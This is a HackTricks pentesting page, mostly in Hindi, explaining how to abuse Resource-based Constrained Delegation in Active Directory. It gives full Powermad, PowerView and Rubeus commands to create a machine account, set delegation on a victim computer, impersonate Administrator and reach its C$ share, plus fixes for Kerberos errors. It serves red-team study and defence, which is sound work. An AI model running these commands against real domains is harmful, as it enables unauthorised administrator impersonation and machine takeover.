# Resource-based Constrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Basics of Resource-based Constrained Delegation

यह मूल [Constrained Delegation](constrained-delegation.md) के समान है लेकिन **इसके बजाय** किसी **ऑब्जेक्ट** को **किसी सेवा के खिलाफ किसी भी उपयोगकर्ता का प्रतिनिधित्व करने** के लिए अनुमतियाँ देने के। Resource-based Constrained Delegation **उस ऑब्जेक्ट में सेट करता है जो इसके खिलाफ किसी भी उपयोगकर्ता का प्रतिनिधित्व कर सकता है**।

इस मामले में, सीमित ऑब्जेक्ट में _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ नामक एक विशेषता होगी जिसमें उस उपयोगकर्ता का नाम होगा जो इसके खिलाफ किसी अन्य उपयोगकर्ता का प्रतिनिधित्व कर सकता है।

इस Constrained Delegation और अन्य डेलीगेशनों के बीच एक और महत्वपूर्ण अंतर यह है कि किसी भी उपयोगकर्ता के पास **एक मशीन खाते पर लिखने के लिए अनुमतियाँ** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) हो सकती हैं जो _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ सेट कर सकता है (अन्य डेलीगेशन के रूपों में आपको डोमेन प्रशासक विशेषाधिकार की आवश्यकता थी)।

### New Concepts

Constrained Delegation में कहा गया था कि **`TrustedToAuthForDelegation`** ध्वज उपयोगकर्ता के _userAccountControl_ मान के अंदर **S4U2Self** करने के लिए आवश्यक है। लेकिन यह पूरी तरह से सच नहीं है।\
वास्तविकता यह है कि भले ही उस मान के बिना, आप किसी भी उपयोगकर्ता के खिलाफ **S4U2Self** कर सकते हैं यदि आप एक **सेवा** हैं (एक SPN है) लेकिन, यदि आपके पास **`TrustedToAuthForDelegation`** है तो लौटाया गया TGS **Forwardable** होगा और यदि आपके पास वह ध्वज नहीं है तो लौटाया गया TGS **Forwardable** नहीं होगा।

हालांकि, यदि **S4U2Proxy** में उपयोग किया गया **TGS** **Forwardable नहीं है** तो **बुनियादी Constrain Delegation** का दुरुपयोग करने की कोशिश करना **काम नहीं करेगा**। लेकिन यदि आप **Resource-Based constrain delegation** का शोषण करने की कोशिश कर रहे हैं, तो यह काम करेगा (यह एक भेद्यता नहीं है, यह एक विशेषता है, स्पष्ट रूप से)।

### Attack structure

> यदि आपके पास **कंप्यूटर** खाते पर **लिखने के समकक्ष विशेषाधिकार** हैं तो आप उस मशीन में **विशेषाधिकार प्राप्त पहुंच** प्राप्त कर सकते हैं।

मान लीजिए कि हमलावर के पास पहले से ही **शिकार कंप्यूटर पर लिखने के समकक्ष विशेषाधिकार** हैं।

1. हमलावर एक खाते को **समझौता** करता है जिसमें एक **SPN** है या **एक बनाता है** (“Service A”)। ध्यान दें कि **कोई भी** _Admin User_ बिना किसी अन्य विशेष विशेषाधिकार के **10 तक** **कंप्यूटर ऑब्जेक्ट्स** (_**MachineAccountQuota**_) बना सकता है और उन्हें एक **SPN** सेट कर सकता है। इसलिए हमलावर बस एक कंप्यूटर ऑब्जेक्ट बना सकता है और एक SPN सेट कर सकता है।
2. हमलावर शिकार कंप्यूटर (ServiceB) पर **अपने WRITE विशेषाधिकार का दुरुपयोग** करता है ताकि **resource-based constrained delegation को कॉन्फ़िगर किया जा सके ताकि ServiceA किसी भी उपयोगकर्ता का प्रतिनिधित्व कर सके** उस शिकार कंप्यूटर (ServiceB) के खिलाफ।
3. हमलावर Rubeus का उपयोग करके **पूर्ण S4U हमला** (S4U2Self और S4U2Proxy) Service A से Service B के लिए एक उपयोगकर्ता के लिए **विशेषाधिकार प्राप्त पहुंच के साथ Service B** का उपयोग करता है।
1. S4U2Self (समझौता/बनाए गए खाते से SPN): मुझसे **Administrator का TGS मांगें** (Forwardable नहीं)।
2. S4U2Proxy: पिछले चरण के **नॉन-Forwardable TGS** का उपयोग करके **Administrator** से **शिकार होस्ट** के लिए **TGS** मांगें।
3. भले ही आप एक नॉन-Forwardable TGS का उपयोग कर रहे हों, क्योंकि आप Resource-based constrained delegation का शोषण कर रहे हैं, यह काम करेगा।
4. हमलावर **पास-दी-टिकट** कर सकता है और **उपयोगकर्ता का प्रतिनिधित्व** कर सकता है ताकि **शिकार ServiceB** तक पहुंच प्राप्त कर सके।

डोमेन के _**MachineAccountQuota**_ की जांच करने के लिए आप उपयोग कर सकते हैं:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## हमला

### कंप्यूटर ऑब्जेक्ट बनाना

आप [powermad](https://github.com/Kevin-Robertson/Powermad)** का उपयोग करके डोमेन के अंदर एक कंप्यूटर ऑब्जेक्ट बना सकते हैं:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegation** कॉन्फ़िगर करना

**activedirectory PowerShell मॉड्यूल का उपयोग करना**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Powerview का उपयोग करना**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### एक पूर्ण S4U हमले का प्रदर्शन

सबसे पहले, हमने नए कंप्यूटर ऑब्जेक्ट को पासवर्ड `123456` के साथ बनाया, इसलिए हमें उस पासवर्ड का हैश चाहिए:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह उस खाते के लिए RC4 और AES हैश प्रिंट करेगा।\
अब, हमला किया जा सकता है:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप Rubeus के `/altservice` पैरामीटर का उपयोग करके केवल एक बार पूछकर अधिक टिकट उत्पन्न कर सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
ध्यान दें कि उपयोगकर्ताओं के पास एक विशेषता है जिसे "**Cannot be delegated**" कहा जाता है। यदि किसी उपयोगकर्ता के पास यह विशेषता True है, तो आप उसकी नकल नहीं कर पाएंगे। यह संपत्ति ब्लडहाउंड के अंदर देखी जा सकती है।
{% endhint %}

### Accessing

अंतिम कमांड लाइन **पूर्ण S4U हमले** को निष्पादित करेगी और **मेमोरी** में Administrator से पीड़ित होस्ट पर TGS को इंजेक्ट करेगी।\
इस उदाहरण में, Administrator से **CIFS** सेवा के लिए एक TGS का अनुरोध किया गया था, इसलिए आप **C$** तक पहुँच सकेंगे:
```bash
ls \\victim.domain.local\C$
```
### विभिन्न सेवा टिकटों का दुरुपयोग

[**यहां उपलब्ध सेवा टिकटों के बारे में जानें**](silver-ticket.md#available-services)।

## केर्बेरोस त्रुटियाँ

* **`KDC_ERR_ETYPE_NOTSUPP`**: इसका मतलब है कि केर्बेरोस को DES या RC4 का उपयोग नहीं करने के लिए कॉन्फ़िगर किया गया है और आप केवल RC4 हैश प्रदान कर रहे हैं। Rubeus को कम से कम AES256 हैश प्रदान करें (या बस इसे rc4, aes128 और aes256 हैश प्रदान करें)। उदाहरण: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: इसका मतलब है कि वर्तमान कंप्यूटर का समय DC के समय से अलग है और केर्बेरोस सही तरीके से काम नहीं कर रहा है।
* **`preauth_failed`**: इसका मतलब है कि दिए गए उपयोगकर्ता नाम + हैश लॉगिन करने के लिए काम नहीं कर रहे हैं। आप हैश उत्पन्न करते समय उपयोगकर्ता नाम के अंदर "$" डालना भूल गए होंगे (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: इसका मतलब हो सकता है:
* जिस उपयोगकर्ता का आप अनुकरण करने की कोशिश कर रहे हैं, वह इच्छित सेवा तक पहुँच नहीं सकता (क्योंकि आप इसका अनुकरण नहीं कर सकते या क्योंकि इसके पास पर्याप्त विशेषाधिकार नहीं हैं)
* मांगी गई सेवा मौजूद नहीं है (यदि आप winrm के लिए एक टिकट मांगते हैं लेकिन winrm चल नहीं रहा है)
* बनाए गए fakecomputer ने कमजोर सर्वर पर अपने विशेषाधिकार खो दिए हैं और आपको उन्हें वापस देना होगा।

## संदर्भ

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) जांचें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** पर हमें **फॉलो** करें** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।**

</details>
{% endhint %}
